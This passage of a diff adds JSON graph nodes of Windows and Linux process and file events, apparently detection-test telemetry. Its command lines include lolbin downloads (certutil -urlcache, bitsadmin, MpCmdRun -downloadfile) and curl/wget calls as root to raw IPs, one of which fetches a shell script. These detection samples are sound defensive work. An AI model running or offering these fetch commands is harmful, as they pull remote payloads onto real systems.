+        "parent_process_id": "Process:{8B6011A9-F32A-616E-073B-01000000F101}:1",
+        "event_id": "11",
+        "id": "File:2ffcceaca489b62f08144fe6ae8d9c9875b00895f39dd257b36fb40d6eb80988:11",
+        "type": "File",
+        "entity_class": "FileEntity",
+        "display_name": "allthethingsx64.dll",
+        "name": "allthethingsx64.dll"
+      }
+    },
+    {
+      "id": "Process:{896A638B-B8E2-6058-B102-00000000AE01}:1",
+      "label": "explorer.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "",
+        "guid": "{896A638B-B8E2-6058-B102-00000000AE01}",
+        "pid": "4244",
+        "image_path": "%windir%\\explorer.exe",
+        "command_line": "",
+        "original_file_name": "",
+        "image_hash": "",
+        "command_hash": "",
+        "parent_process": null,
+        "user": null,
+        "event_id": "1",
+        "id": "Process:{896A638B-B8E2-6058-B102-00000000AE01}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "explorer.exe",
+        "name": "explorer.exe"
+      }
+    },
+    {
+      "id": "File:b60d30145077a0dc36fa59c19b14d53a86694490ed265c7f928ded3122ef373a:7",
+      "label": "win32u.dll",
+      "type": "file",
+      "group": "File",
+      "properties": {
+        "file_path": "%system32%\\win32u.dll",
+        "source_image_path": "%system32%\\curl.exe",
+        "content_hash": "MD5=6A40F9C63B52CB4E8271CF3418618033,SHA256=A2BE23DA7AADFA9118130C939CD59D86E590957172FF404511EE6C5EC5147F15",
+        "parent_process_id": "Process:{8B6011A9-F32A-616E-083B-01000000F101}:1",
+        "event_id": "7",
+        "id": "File:b60d30145077a0dc36fa59c19b14d53a86694490ed265c7f928ded3122ef373a:7",
+        "type": "File",
+        "entity_class": "FileEntity",
+        "display_name": "win32u.dll",
+        "name": "win32u.dll"
+      }
+    },
+    {
+      "id": "File:eaf2da9d52e781ed01fb925d0408d3c284d0876a7df0e9685f75a2df715f33a2:7",
+      "label": "gdi32full.dll",
+      "type": "file",
+      "group": "File",
+      "properties": {
+        "file_path": "%system32%\\gdi32full.dll",
+        "source_image_path": "%system32%\\curl.exe",
+        "content_hash": "MD5=9D82D7DBC3D9E0D8E86D10A5B1BF736E,SHA256=270CA1A42ECB4C22E826C1C95924F0014CC99254AB55B7167DA144D45E238E6D",
+        "parent_process_id": "Process:{8B6011A9-F32A-616E-083B-01000000F101}:1",
+        "event_id": "7",
+        "id": "File:eaf2da9d52e781ed01fb925d0408d3c284d0876a7df0e9685f75a2df715f33a2:7",
+        "type": "File",
+        "entity_class": "FileEntity",
+        "display_name": "gdi32full.dll",
+        "name": "gdi32full.dll"
+      }
+    },
+    {
+      "id": "Process:{ec28c72e-0cf7-62e4-78ed-32828d550000}:1",
+      "label": "-",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "-",
+        "guid": "{ec28c72e-0cf7-62e4-78ed-32828d550000}",
+        "pid": "23352",
+        "image_path": "usr\\bin\\curl",
+        "command_line": "curl -so https:\\gist.githubusercontent.com\\mhaggis\\b7fe00e3f4b12de4dc302ad3b0a9b26f\\raw\\5f6b35cce55d038403bbc38272f45853ea42c390\\test.mof \\tmp",
+        "original_file_name": "-",
+        "image_hash": "-",
+        "command_hash": "cbda58b37a1b4dcf66928665d7e4939e38b4080c6907e8aa5d5f7dc0ea4b3aca",
+        "parent_process_id": "Process:{ec28c72e-edb1-62e3-4884-14ef6f550000}:1",
+        "user_id": "user:\\root",
+        "event_id": "1",
+        "id": "Process:{ec28c72e-0cf7-62e4-78ed-32828d550000}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "-",
+        "name": "-"
+      }
+    },
+    {
+      "id": "File:19472e477d247f4145673e38acf57b83f708b61266308dea6f4e2b3b47b7ce59:7",
+      "label": "kernelbase.dll",
+      "type": "file",
+      "group": "File",
+      "properties": {
+        "file_path": "%system32%\\kernelbase.dll",
+        "source_image_path": "%system32%\\curl.exe",
+        "content_hash": "MD5=0F627827D9CFFA8E0BCF30F013FB7209,SHA256=EA47C3E471801ACA92EE449C66CF785EA670ADE92A5A2D5CDB81C93DD72ABEF0",
+        "parent_process_id": "Process:{8B6011A9-F32A-616E-083B-01000000F101}:1",
+        "event_id": "7",
+        "id": "File:19472e477d247f4145673e38acf57b83f708b61266308dea6f4e2b3b47b7ce59:7",
+        "type": "File",
+        "entity_class": "FileEntity",
+        "display_name": "kernelbase.dll",
+        "name": "kernelbase.dll"
+      }
+    },
+    {
+      "id": "Process:{ec2d99e9-a732-61b4-785d-d223b3550000}:1",
+      "label": "-",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "-",
+        "guid": "{ec2d99e9-a732-61b4-785d-d223b3550000}",
+        "pid": "13753",
+        "image_path": "usr\\bin\\curl",
+        "command_line": "curl -s 80.71.158.11\\lh.sh",
+        "original_file_name": "-",
+        "image_hash": "-",
+        "command_hash": "12efc951c15fa57ca490ad5ec2fa8e08162df8c390e3f76f86cc649489c8ce98",
+        "parent_process_id": "Process:{00000000-0000-0000-0000-000000000000}:1",
+        "user_id": "user:\\root",
+        "event_id": "1",
+        "id": "Process:{ec2d99e9-a732-61b4-785d-d223b3550000}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "-",
+        "name": "-"
+      }
+    },
+    {
+      "id": "Process:{8B6011A9-E4B7-618B-8EA5-04000000F101}:1",
+      "label": "the curl executable",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "the curl executable",
+        "guid": "{8B6011A9-E4B7-618B-8EA5-04000000F101}",
+        "pid": "8852",
+        "image_path": "%system32%\\curl.exe",
+        "command_line": "curl  -d name=admin -d shoesize=12 http:\\example.com",
+        "original_file_name": "curl.exe",
+        "image_hash": "MD5=46A8FE9CE08112D542220E850323D334,SHA256=7F43DE7FB365D85CF8FEE0EC66D43B09FB3D559B02A432E5925E3748BC3BD528",
+        "command_hash": "906e59b92c87560e201246b69762d08b593b0163be8ea6687c6eb82ba988972d",
+        "parent_process_id": "Process:{8B6011A9-92C8-616D-4E11-01000000F101}:1",
+        "user_id": "User:S-1-5-18",
+        "event_id": "1",
+        "id": "Process:{8B6011A9-E4B7-618B-8EA5-04000000F101}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "the curl executable",
+        "name": "the curl executable"
+      }
+    },
+    {
+      "id": "File:6741bbd10169c53837e451e1512a25d8d4d4073c784ea7b4c5112a3a4cecbd9e:7",
+      "label": "dnsapi.dll",
+      "type": "file",
+      "group": "File",
+      "properties": {
+        "file_path": "%system32%\\dnsapi.dll",
+        "source_image_path": "%system32%\\curl.exe",
+        "content_hash": "MD5=D7651F99299B13D576A72643BFC44944,SHA256=589302E630C473DBDF4CE92C59F00B029FCA0C228E7111A764166E16025FA1A9",
+        "parent_process_id": "Process:{8B6011A9-F32A-616E-083B-01000000F101}:1",
+        "event_id": "7",
+        "id": "File:6741bbd10169c53837e451e1512a25d8d4d4073c784ea7b4c5112a3a4cecbd9e:7",
+        "type": "File",
+        "entity_class": "FileEntity",
+        "display_name": "dnsapi.dll",
+        "name": "dnsapi.dll"
+      }
+    },
+    {
+      "id": "Process:{896A638B-B3FA-605B-7A69-00000000AE01}:10",
+      "label": "certutil.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "certutil.exe",
+        "guid": "{896A638B-B3FA-605B-7A69-00000000AE01}",
+        "pid": "4760",
+        "image_path": "%system32%\\certutil.exe",
+        "command_line": "GrantedAccess with bitmask: 0x1410 for certutil.exe",
+        "original_file_name": "",
+        "image_hash": "",
+        "command_hash": "422365fe0c587077bc2c1c689c95c561d83fecd21e73409b250d25fb8481fecf",
+        "parent_process_id": "Process:{896A638B-B8E2-6058-B102-00000000AE01}:1",
+        "user_id": "User:S-1-5-18",
+        "event_id": "10",
+        "id": "Process:{896A638B-B3FA-605B-7A69-00000000AE01}:10",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "certutil.exe",
+        "name": "certutil.exe"
+      }
+    },
+    {
+      "id": "Process:{38b9f94a-e3cf-6754-8b80-000000002f03}:1",
+      "label": "certutil.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "certutil.exe",
+        "guid": "{38b9f94a-e3cf-6754-8b80-000000002f03}",
+        "pid": "3640",
+        "image_path": "%system32%\\certutil.exe",
+        "command_line": "certutil  \\url http:\\7-zip.org\\a\\7z1604-x64.exe",
+        "original_file_name": "certutil.exe",
+        "image_hash": "MD5=E53CE0751C3D4C884A5FFF753462EFFA,SHA256=98D63F0F44C8AFAF1A4B11E38E92F81ADD7F59FD1FF7B296FC3D40C7F0094177,IMPHASH=683B8A445B00A271FC57848D893BD6C4",
+        "command_hash": "ef365f447646ca4efd95ad0ab0d32c22a51708f411742be9fa07aeb54dcf9e0f",
+        "parent_process_id": "Process:{38b9f94a-6af3-6754-0b74-000000002f03}:1",
+        "user_id": "User:S-1-5-18",
+        "event_id": "1",
+        "id": "Process:{38b9f94a-e3cf-6754-8b80-000000002f03}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "certutil.exe",
+        "name": "certutil.exe"
+      }
+    },
+    {
+      "id": "Process:{ec2d99e9-ce9c-61b3-ec0e-02199b550000}:1",
+      "label": "-",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "-",
+        "guid": "{ec2d99e9-ce9c-61b3-ec0e-02199b550000}",
+        "pid": "11452",
+        "image_path": "bin\\busybox",
+        "command_line": "wget -q -o- 45.155.205.233:5874\\96.126.96.16:8080",
+        "original_file_name": "-",
+        "image_hash": "-",
+        "command_hash": "7d08c782c9fdc51209d04c5e7d7aa8fd6c1bd329433e6f54f60d83b41c9fb2e7",
+        "parent_process_id": "Process:{ec2d99e9-ce9c-61b3-ecee-10bc91550000}:1",
+        "user_id": "user:\\root",
+        "event_id": "1",
+        "id": "Process:{ec2d99e9-ce9c-61b3-ec0e-02199b550000}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "-",
+        "name": "-"
+      }
+    },
+    {
+      "id": "Process:{896A638B-B3E4-605B-6E69-00000000AE01}:1",
+      "label": "cmd.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "windows command processor",
+        "guid": "{896A638B-B3E4-605B-6E69-00000000AE01}",
+        "pid": "7500",
+        "image_path": "%system32%\\cmd.exe",
+        "command_line": "%system32%\\cmd.exe\" \\c \"%windir%\\system32\\bitsadmin.exe \\transfer qcxjb7 \\priority high https:\\raw.githubusercontent.com\\redcanaryco\\atomic-red-team\\master\\license.txt %temp%\\atomic-license.txt <bitsadmin_transfer>",
+        "original_file_name": "cmd.exe",
+        "image_hash": "MD5=F4F684066175B77E0C3A000549D2922C,SHA256=935C1861DF1F4018D698E8B65ABFA02D7E9037D8F68CA3C2065B6CA165D44AD2,IMPHASH=3062ED732D4B25D1C64F084DAC97D37A",
+        "command_hash": "bfa5e17351f2e3d2bff065fa165238684b7204c23279bf3e180320696cd193d3",
+        "event_id": "1",
+        "id": "Process:{896A638B-B3E4-605B-6E69-00000000AE01}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "cmd.exe",
+        "name": "cmd.exe",
+        "parent_process_id": "Process:{896A638B-FBAD-6058-BE11-00000000AE01}:1",
+        "user_id": "User:S-1-5-18"
+      }
+    },
+    {
+      "id": "Process:{896A638B-B422-605B-8B69-00000000AE01}:1",
+      "label": "certutil.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "certutil.exe",
+        "guid": "{896A638B-B422-605B-8B69-00000000AE01}",
+        "pid": "7404",
+        "image_path": "%system32%\\certutil.exe",
+        "command_line": "%system32%\\certutil.exe\" –urlcache -split -f https:\\raw.githubusercontent.com\\redcanaryco\\atomic-red-team\\master\\license.txt c:\\temp\\foo.txt",
+        "original_file_name": "certutil.exe",
+        "image_hash": "MD5=BF7CEA72AE186A10239F830F93492A73,SHA256=A50DFE408565C2BB011D013AC43E616B2A595B1D06EB9B083F519672732498DA,IMPHASH=442218E88D4D6AA0BE3165DD7B20A4C4",
+        "command_hash": "9f6925cf78093ff7c4d9062034e74ba9a7f01b38fe9fed2d9497736f46188586",
+        "event_id": "1",
+        "id": "Process:{896A638B-B422-605B-8B69-00000000AE01}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "certutil.exe",
+        "name": "certutil.exe",
+        "parent_process_id": "Process:{896A638B-B3F6-605B-7769-00000000AE01}:1",
+        "user_id": "User:S-1-5-18"
+      }
+    },
+    {
+      "id": "File:800e466bba30b6e86d963cc81c687688dca4fd6aa7eb181e5c5271f4acc665b4:7",
+      "label": "crypt32.dll",
+      "type": "file",
+      "group": "File",
+      "properties": {
+        "file_path": "%system32%\\crypt32.dll",
+        "source_image_path": "%system32%\\curl.exe",
+        "content_hash": "MD5=95BA70CFA8087A209500D7D350BF3A59,SHA256=4265157E8DC2A0E32A6328D54181CC31FD24E3017E60B270623C2CDBE5FAB4FA",
+        "parent_process_id": "Process:{8B6011A9-F32A-616E-083B-01000000F101}:1",
+        "event_id": "7",
+        "id": "File:800e466bba30b6e86d963cc81c687688dca4fd6aa7eb181e5c5271f4acc665b4:7",
+        "type": "File",
+        "entity_class": "FileEntity",
+        "display_name": "crypt32.dll",
+        "name": "crypt32.dll"
+      }
+    },
+    {
+      "id": "File:d3ed69ac19b73b46deb7f9d6ae08b1cabe9c64d0534e1ed3cc8be6b7c4dd6bb8:23",
+      "label": "allthethingsx64.dll",
+      "type": "file",
+      "group": "File",
+      "properties": {
+        "file_path": "%userprofile%\\music\\allthethingsx64.dll",
+        "source_image_path": "%system32%\\curl.exe",
+        "content_hash": "MD5=BB806E36DA8AF680E030BAC2EEA80DAF,SHA256=14E89184687F07212D10C5FD7CB70781982D43B6EA51B74D489A1F4E6FCE72BA",
+        "parent_process_id": "Process:{8B6011A9-F32A-616E-063B-01000000F101}:1",
+        "event_id": "23",
+        "id": "File:d3ed69ac19b73b46deb7f9d6ae08b1cabe9c64d0534e1ed3cc8be6b7c4dd6bb8:23",
+        "type": "File",
+        "entity_class": "FileEntity",
+        "display_name": "allthethingsx64.dll",
+        "name": "allthethingsx64.dll"
+      }
+    },
+    {
+      "id": "Process:{896A638B-B41B-605B-8969-00000000AE01}:1",
+      "label": "certutil.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "certutil.exe",
+        "guid": "{896A638B-B41B-605B-8969-00000000AE01}",
+        "pid": "8116",
+        "image_path": "%system32%\\certutil.exe",
+        "command_line": "%system32%\\certutil.exe\" —urlcache -split -f https:\\raw.githubusercontent.com\\redcanaryco\\atomic-red-team\\master\\license.txt c:\\temp\\foo.txt",
+        "original_file_name": "certutil.exe",
+        "image_hash": "MD5=BF7CEA72AE186A10239F830F93492A73,SHA256=A50DFE408565C2BB011D013AC43E616B2A595B1D06EB9B083F519672732498DA,IMPHASH=442218E88D4D6AA0BE3165DD7B20A4C4",
+        "command_hash": "23e6b559f5b8a21440338e031d425a3f68c94a0567ca69f332fc6b818101231c",
+        "event_id": "1",
+        "id": "Process:{896A638B-B41B-605B-8969-00000000AE01}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "certutil.exe",
+        "name": "certutil.exe",
+        "parent_process_id": "Process:{896A638B-B3F6-605B-7769-00000000AE01}:1",
+        "user_id": "User:S-1-5-18"
+      }
+    },
+    {
+      "id": "File:85b4704cb6b28a1cf25850582ece871fe948f8d1677ff5b8836dbe7bb2f3e180:7",
+      "label": "wldap32.dll",
+      "type": "file",
+      "group": "File",
+      "properties": {
+        "file_path": "%system32%\\wldap32.dll",
+        "source_image_path": "%system32%\\curl.exe",
+        "content_hash": "MD5=12D6C3E8AC705BB42D377C05714F551C,SHA256=E67F6DB96F062A319312C365F1F55B2B38B0F90B77FFDA2522418709CBA45EB3",
+        "parent_process_id": "Process:{8B6011A9-F32A-616E-083B-01000000F101}:1",
+        "event_id": "7",
+        "id": "File:85b4704cb6b28a1cf25850582ece871fe948f8d1677ff5b8836dbe7bb2f3e180:7",
+        "type": "File",
+        "entity_class": "FileEntity",
+        "display_name": "wldap32.dll",
+        "name": "wldap32.dll"
+      }
+    },
+    {
+      "id": "Process:{896A638B-B5CB-6058-1600-00000000AE01}:1",
+      "label": "svchost.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "",
+        "guid": "{896A638B-B5CB-6058-1600-00000000AE01}",
+        "pid": "1308",
+        "image_path": "%system32%\\svchost.exe",
+        "command_line": "",
+        "original_file_name": "",
+        "image_hash": "",
+        "command_hash": "",
+        "parent_process": null,
+        "user": null,
+        "event_id": "1",
+        "id": "Process:{896A638B-B5CB-6058-1600-00000000AE01}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "svchost.exe",
+        "name": "svchost.exe"
+      }
+    },
+    {
+      "id": "Process:{ec28c72e-0de8-62e4-78dd-fab9d7550000}:1",
+      "label": "-",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "-",
+        "guid": "{ec28c72e-0de8-62e4-78dd-fab9d7550000}",
+        "pid": "23414",
+        "image_path": "usr\\bin\\curl",
+        "command_line": "curl -ss https:\\raw.githubusercontent.com\\redcanaryco\\atomic-red-team\\master\\atomics\\t1059.004\\src\\echo-art-fish.sh",
+        "original_file_name": "-",
+        "image_hash": "-",
+        "command_hash": "3dfeea58ba14273e066848391d0e098473566a743e1129d3fa7dcf732076872c",
+        "parent_process_id": "Process:{ec28c72e-edb1-62e3-4884-14ef6f550000}:1",
+        "user_id": "user:\\root",
+        "event_id": "1",
+        "id": "Process:{ec28c72e-0de8-62e4-78dd-fab9d7550000}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "-",
+        "name": "-"
+      }
+    },
+    {
+      "id": "Process:{896A638B-B3E2-605B-6A69-00000000AE01}:1",
+      "label": "cmd.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "windows command processor",
+        "guid": "{896A638B-B3E2-605B-6A69-00000000AE01}",
+        "pid": "5720",
+        "image_path": "%system32%\\cmd.exe",
+        "command_line": "cmd \\c certutil -urlcache -split -f https:\\raw.githubusercontent.com\\redcanaryco\\atomic-red-team\\master\\license.txt atomic-license.txt",
+        "original_file_name": "cmd.exe",
+        "image_hash": "MD5=F4F684066175B77E0C3A000549D2922C,SHA256=935C1861DF1F4018D698E8B65ABFA02D7E9037D8F68CA3C2065B6CA165D44AD2,IMPHASH=3062ED732D4B25D1C64F084DAC97D37A",
+        "command_hash": "1920693c3319d14b0436b4b25f96e5373e872e248116be89ced3d09951ff8b36",
+        "event_id": "1",
+        "id": "Process:{896A638B-B3E2-605B-6A69-00000000AE01}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "cmd.exe",
+        "name": "cmd.exe",
+        "parent_process_id": "Process:{896A638B-B3E2-605B-6969-00000000AE01}:1",
+        "user_id": "User:S-1-5-18"
+      }
+    },
+    {
+      "id": "File:f554777f756da45f3b15702376fb6163958555c5ce906ee07473cc27c12d441f:7",
+      "label": "secur32.dll",
+      "type": "file",
+      "group": "File",
+      "properties": {
+        "file_path": "%system32%\\secur32.dll",
+        "source_image_path": "%system32%\\curl.exe",
+        "content_hash": "MD5=BCF1B2F76F8A3A3E9E8F4D4322954651,SHA256=46B327CD50E728CBC22BD80F39DCEF2789AB780C77B6D285EEB90126B06EEEB5",
+        "parent_process_id": "Process:{8B6011A9-F32A-616E-083B-01000000F101}:1",
+        "event_id": "7",
+        "id": "File:f554777f756da45f3b15702376fb6163958555c5ce906ee07473cc27c12d441f:7",
+        "type": "File",
+        "entity_class": "FileEntity",
+        "display_name": "secur32.dll",
+        "name": "secur32.dll"
+      }
+    },
+    {
+      "id": "Process:{ec2d99e9-8859-61b3-785d-af70fc550000}:1",
+      "label": "-",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "-",
+        "guid": "{ec2d99e9-8859-61b3-785d-af70fc550000}",
+        "pid": "7388",
+        "image_path": "usr\\bin\\curl",
+        "command_line": "curl -s 45.155.205.233:5874",
+        "original_file_name": "-",
+        "image_hash": "-",
+        "command_hash": "89f6a714597e48045aeb7905a454bdfcc39c69bd22e07949687f542a86d6bc96",
+        "parent_process_id": "Process:{ec2d99e9-8796-61b3-08c4-2a1dfd550000}:1",
+        "user_id": "user:\\root",
+        "event_id": "1",
+        "id": "Process:{ec2d99e9-8859-61b3-785d-af70fc550000}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "-",
+        "name": "-"
+      }
+    },
+    {
+      "id": "Process:{896A638B-B3E7-605B-7569-00000000AE01}:1",
+      "label": "cmd.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "windows command processor",
+        "guid": "{896A638B-B3E7-605B-7569-00000000AE01}",
+        "pid": "1396",
+        "image_path": "%system32%\\cmd.exe",
+        "command_line": "%system32%\\cmd.exe\" \\c \"cd \"%programdata%\\microsoft\\windows defender\\platform\\4.18*\" & mpcmdrun.exe -downloadfile -url https:\\raw.githubusercontent.com\\redcanaryco\\atomic-red-team\\master\\license.txt -path %temp%\\atomic-license.txt",
+        "original_file_name": "cmd.exe",
+        "image_hash": "MD5=F4F684066175B77E0C3A000549D2922C,SHA256=935C1861DF1F4018D698E8B65ABFA02D7E9037D8F68CA3C2065B6CA165D44AD2,IMPHASH=3062ED732D4B25D1C64F084DAC97D37A",
+        "command_hash": "9a4b79494b5b3568b8781fc0135718bae895d02970ba1ed7a814f7c4462961e0",
+        "event_id": "1",
+        "id": "Process:{896A638B-B3E7-605B-7569-00000000AE01}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "cmd.exe",
+        "name": "cmd.exe",
+        "parent_process_id": "Process:{896A638B-FBAD-6058-BE11-00000000AE01}:1",
+        "user_id": "User:S-1-5-18"
+      }
+    },
+    {
+      "id": "File:5b462892012eff059a85498f6863d643217009c3f9e07f35e71e72b9134c1869:7",
+      "label": "ntdll.dll",
+      "type": "file",
+      "group": "File",
+      "properties": {
+        "file_path": "%system32%\\ntdll.dll",
+        "source_image_path": "%system32%\\curl.exe",
+        "content_hash": "MD5=36B87C41EE39F3051D116F735EBEF866,SHA256=9C45BAE6D7E27B3AE04BBF88B96686C04ED6A43695558E82B687013BA0383F8A",
+        "parent_process_id": "Process:{8B6011A9-F32A-616E-083B-01000000F101}:1",
+        "event_id": "7",
+        "id": "File:5b462892012eff059a85498f6863d643217009c3f9e07f35e71e72b9134c1869:7",
+        "type": "File",
+        "entity_class": "FileEntity",
+        "display_name": "ntdll.dll",
+        "name": "ntdll.dll"
+      }
+    },
+    {
+      "id": "File:139f7a6ced96b702818ddfea2736ef671008fda2b4d1c63e1f6f5aecaa23d8e6:7",
+      "label": "iphlpapi.dll",
+      "type": "file",
+      "group": "File",
+      "properties": {
+        "file_path": "%system32%\\iphlpapi.dll",
+        "source_image_path": "%system32%\\curl.exe",
+        "content_hash": "MD5=3CD38EDF9CA12F91131EDEE32D1C9DF5,SHA256=AF2440640BF8BDEAAF0DECDD7C354158E415ED0AA340ABA7A6CCCDC09C1E728B",
+        "parent_process_id": "Process:{8B6011A9-F32A-616E-083B-01000000F101}:1",
+        "event_id": "7",
+        "id": "File:139f7a6ced96b702818ddfea2736ef671008fda2b4d1c63e1f6f5aecaa23d8e6:7",
+        "type": "File",
+        "entity_class": "FileEntity",
+        "display_name": "iphlpapi.dll",
+        "name": "iphlpapi.dll"
+      }
+    },
+    {
+      "id": "Process:{896A638B-FBAD-6058-BE11-00000000AE01}:1",
+      "label": "powershell.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "",
+        "guid": "{896A638B-FBAD-6058-BE11-00000000AE01}",
+        "pid": "4492",
+        "image_path": "%system32%\\windowspowershell\\v1.0\\powershell.exe",
+        "command_line": "%system32%\\windowspowershell\\v1.0\\powershell.exe",
+        "original_file_name": "",
+        "image_hash": "",
+        "command_hash": "",
+        "parent_process": null,
+        "user": null,
+        "event_id": "1",
+        "id": "Process:{896A638B-FBAD-6058-BE11-00000000AE01}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "powershell.exe",
+        "name": "powershell.exe"
+      }
+    },
+    {
+      "id": "Process:{ec28c72e-cd5e-62e3-785d-93e58d550000}:1",
+      "label": "-",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "-",
+        "guid": "{ec28c72e-cd5e-62e3-785d-93e58d550000}",
+        "pid": "22870",
+        "image_path": "usr\\bin\\curl",
+        "command_line": "curl -x http:\\user:pwd@ curl --preproxy socks5:\\proxy.example -x http:\\http.example https:\\example.com127.0.0.1:1234 http:\\httpbin.org\\ip",
+        "original_file_name": "-",
+        "image_hash": "-",
+        "command_hash": "4ca96668cf91cf240008d84902362697647a7731d922e09569763a178e306cee",
+        "parent_process_id": "Process:{ec28c72e-caa1-62e3-48c4-b8cb06560000}:1",
+        "user_id": "user:\\ubuntu",
+        "event_id": "1",
+        "id": "Process:{ec28c72e-cd5e-62e3-785d-93e58d550000}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "-",
+        "name": "-"
+      }
+    },
+    {
+      "id": "File:b2a83787692d9f5ec141753f101524764ea3b8ed60a1bd0cd2417cd93829fff8:7",
+      "label": "user32.dll",
+      "type": "file",
+      "group": "File",
+      "properties": {
+        "file_path": "%system32%\\user32.dll",
+        "source_image_path": "%system32%\\curl.exe",
+        "content_hash": "MD5=883B59C5557E8A9B3C1E1ED1CA48CD5A,SHA256=271800C20A96587265BF83DE2EFC11329EEB2B6C0D57E5E0BCD137FB96BFE6E3",
+        "parent_process_id": "Process:{8B6011A9-F32A-616E-083B-01000000F101}:1",
+        "event_id": "7",
+        "id": "File:b2a83787692d9f5ec141753f101524764ea3b8ed60a1bd0cd2417cd93829fff8:7",
+        "type": "File",
+        "entity_class": "FileEntity",
+        "display_name": "user32.dll",
+        "name": "user32.dll"
+      }
+    },
+    {
+      "id": "Process:{896A638B-B3FF-605B-7F69-00000000AE01}:1",
+      "label": "certutil.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "certutil.exe",
+        "guid": "{896A638B-B3FF-605B-7F69-00000000AE01}",
+        "pid": "3440",
+        "image_path": "%system32%\\certutil.exe",
+        "command_line": "%system32%\\certutil.exe\" ―verifyctl -split -f https:\\raw.githubusercontent.com\\redcanaryco\\atomic-red-team\\master\\license.txt",
+        "original_file_name": "certutil.exe",
+        "image_hash": "MD5=BF7CEA72AE186A10239F830F93492A73,SHA256=A50DFE408565C2BB011D013AC43E616B2A595B1D06EB9B083F519672732498DA,IMPHASH=442218E88D4D6AA0BE3165DD7B20A4C4",
+        "command_hash": "cf8c15cc497d61920f8714c1c0ef25948eb346598db25b03dfd91b0d2e170824",
+        "parent_process_id": "Process:{896A638B-B3F6-605B-7769-00000000AE01}:1",
+        "user_id": "User:S-1-5-18",
+        "event_id": "1",
+        "id": "Process:{896A638B-B3FF-605B-7F69-00000000AE01}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "certutil.exe",
+        "name": "certutil.exe"
+      }
+    },
+    {
+      "id": "Process:{896A638B-B3F6-605B-7869-00000000AE01}:10",
+      "label": "certutil.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "certutil.exe",
+        "guid": "{896A638B-B3F6-605B-7869-00000000AE01}",
+        "pid": "4944",
+        "image_path": "%system32%\\certutil.exe",
+        "command_line": "GrantedAccess with bitmask: 0x1400 for certutil.exe",
+        "original_file_name": "",
+        "image_hash": "",
+        "command_hash": "822486ee38c12daf513025bfd7169372f9ce24f24f5a3de99652991b39fb7b1f",
+        "parent_process_id": "Process:{896A638B-B5CB-6058-1600-00000000AE01}:1",
+        "user_id": "User:S-1-5-18",
+        "event_id": "10",
+        "id": "Process:{896A638B-B3F6-605B-7869-00000000AE01}:10",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "certutil.exe",
+        "name": "certutil.exe"
+      }
+    },
+    {
+      "id": "File:884b181573300ba4a65b5ae721a3450db12c6c2d4fab187a3bc6e28ff8311ed9:7",
+      "label": "msvcrt.dll",
+      "type": "file",
+      "group": "File",
+      "properties": {
+        "file_path": "%system32%\\msvcrt.dll",
+        "source_image_path": "%system32%\\curl.exe",
+        "content_hash": "MD5=0AF8989DD67A135B536CF948E3EFB7EB,SHA256=C693DA0EF4DCF3BC244661B9FD280FE12C3053FDD7B977712C0CF210831B2EF4",
+        "parent_process_id": "Process:{8B6011A9-F32A-616E-083B-01000000F101}:1",
+        "event_id": "7",
+        "id": "File:884b181573300ba4a65b5ae721a3450db12c6c2d4fab187a3bc6e28ff8311ed9:7",
+        "type": "File",
+        "entity_class": "FileEntity",
+        "display_name": "msvcrt.dll",
+        "name": "msvcrt.dll"
+      }
+    },
+    {
+      "id": "Process:{ec2d99e9-8852-61b3-785d-5260cd550000}:1",
+      "label": "-",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "-",
+        "guid": "{ec2d99e9-8852-61b3-785d-5260cd550000}",
+        "pid": "7385",
+        "image_path": "usr\\bin\\curl",
+        "command_line": "curl -s 45.155.205.233:5874\\104.214.103.78:80",
+        "original_file_name": "-",
+        "image_hash": "-",
+        "command_hash": "9a115a49bec02243f1bd978da37bfc23e1a0aa33c16445297410a0ae2e161a99",
+        "parent_process_id": "Process:{ec2d99e9-8796-61b3-08c4-2a1dfd550000}:1",
+        "user_id": "user:\\root",
+        "event_id": "1",
